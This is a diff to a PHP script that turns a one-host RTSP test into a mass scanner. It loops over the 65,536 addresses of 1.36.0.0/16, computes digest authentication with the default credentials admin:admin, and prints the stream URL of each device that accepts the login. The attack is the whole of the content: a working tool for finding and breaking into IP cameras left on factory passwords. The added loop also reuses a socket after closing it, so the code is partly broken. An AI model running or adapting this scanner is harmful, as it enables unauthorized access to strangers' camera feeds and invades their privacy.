@@ -1,13 +1,11 @@
 <?php
-error_reporting(E_ALL);
+error_reporting(E_ERROR);
 
 echo "TCP/IP Connection\n";
 
 /* Get the port for the rtsp service. */
 $service_port = getservbyname('rtsp', 'tcp');
 
-$address = '1.36.35.222';
-$url = 'rtsp://1.36.35.222/11';
 
 /* Create a TCP/IP socket. */
 $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
@@ -17,12 +15,37 @@ if ($socket === false) {
     echo "OK.\n";
 }
 
-echo "Attempting to connect to '$address' on port '$service_port'...";
-$result = socket_connect($socket, $address, $service_port);
+socket_set_option($socket, SOL_SOCKET, SO_RCVTIMEO, array('sec' => 1, 'usec' => 0));
+socket_set_option($socket, SOL_SOCKET, SO_SNDTIMEO, array('sec' => 1, 'usec' => 0));
+
+//$address = '1.36.35.222';
+//checking($address);
+
+for($a=1;$a<=1;$a++){
+for($b=36;$b<=36;$b++){
+for($c=0;$c<=255;$c++){
+for($d=0;$d<=255;$d++){
+	$address = "$a.$b.$c.$d";
+	checking($address);
+}}}}
+
+function checking($address) {
+
+global $service_port, $socket;
+
+$url = 'rtsp://'.$address.'/11';
+
+//echo "Attempting to connect to '$address' on port '$service_port'...";
+try{
+	$result = socket_connect($socket, $address, $service_port);
+} catch(Exception $e) {
+	return false;
+}
 if ($result === false) {
-    echo "socket_connect() failed.\nReason: ($result) " . socket_strerror(socket_last_error($socket)) . "\n";
+    //echo "socket_connect() failed.\nReason: ($result) " . socket_strerror(socket_last_error($socket)) . "\n";
+	return false;
 } else {
-    echo "OK.\n";
+    //echo "OK.\n";
 }
 
 $in = "OPTIONS ".$url." RTSP/1.0\r\n";
@@ -35,13 +58,13 @@ $in .= "Date: Web, 31 Aug 2016 16:34:12 GMT\r\n\r\n";
 
 $out = '';
 
-echo "Sending RTSP HEAD request...";
+//echo "Sending RTSP HEAD request...";
 socket_write($socket, $in, strlen($in));
-echo "OK.\n";
+//echo "OK.\n";
 
-echo "Reading response:\n\n";
+//echo "Reading response:\n\n";
 $out = socket_read($socket, 2048);
-echo $out;
+//echo $out;
 
 $in = "DESCRIBE ".$url." RTSP/1.0\r\n";
 $in .= "CSeq: 2\r\n";
@@ -50,26 +73,26 @@ $in .= "Accept: application/sdp\r\n";
 $in .= "Date: Web, 31 Aug 2016 16:34:12 GMT\r\n\r\n";
 $out = '';
 
-echo "Sending RTSP HEAD request...";
+//echo "Sending RTSP HEAD request...";
 socket_write($socket, $in, strlen($in));
-echo "OK.\n";
+//echo "OK.\n";
 
-echo "Reading response:\n\n";
+//echo "Reading response:\n\n";
 $out = socket_read($socket, 2048);
-echo $out;
+//echo $out;
 
 $realm = substr($out,strpos($out,'realm="')+7);
 $realm = substr($realm,0,strpos($realm,'"'));
-echo "realm : ".$realm."\n";
+//echo "realm : ".$realm."\n";
 
 $nonce = substr($out,strpos($out,'nonce="')+7);
 $nonce = substr($nonce,0,strpos($nonce,'"'));
-echo "nonce : ".$nonce."\n";
+//echo "nonce : ".$nonce."\n";
 
 $ha1 = md5("admin:".$realm.":admin");
 $ha2 = md5("DESCRIBE:".$url);
 $response = md5($ha1.":".$nonce.":".$ha2);
-echo "response : ".$response."\n";
+//echo "response : ".$response."\n";
 
 $in = "DESCRIBE ".$url." RTSP/1.0\r\n";
 $in .= "CSeq: 3\r\n";
@@ -78,21 +101,26 @@ $in .= "Accept: application/sdp\r\n";
 $in .= "Authorization: Digest username=\"admin\", ";
 $in .= "realm=\"".$realm."\", ";
 $in .= "nonce=\"".$nonce."\", ";
-$in .= "url=\"".$url."\", ";
+$in .= "uri=\"".$url."\", ";
 $in .= "response=\"".$response."\"\r\n";
 $in .= "Date: Web, 31 Aug 2016 16:34:12 GMT\r\n\r\n";
 
-echo "Write $in";
+//echo "Write $in";
 
-echo "Sending RTSP HEAD request...";
+//echo "Sending RTSP HEAD request...";
 socket_write($socket, $in, strlen($in));
-echo "OK.\n";
+//echo "OK.\n";
 
-echo "Reading response:\n\n";
+//echo "Reading response:\n\n";
 $out = socket_read($socket, 2048);
-echo $out;
+//echo $out;
+if(strpos($out,"200 OK")>0) {
+	echo $url."\r\n";
+}
 
-echo "Closing socket...";
+//echo "Closing socket...";
 socket_close($socket);
-echo "OK.\n\n";
+//echo "OK.\n\n";
+
+}
 ?>
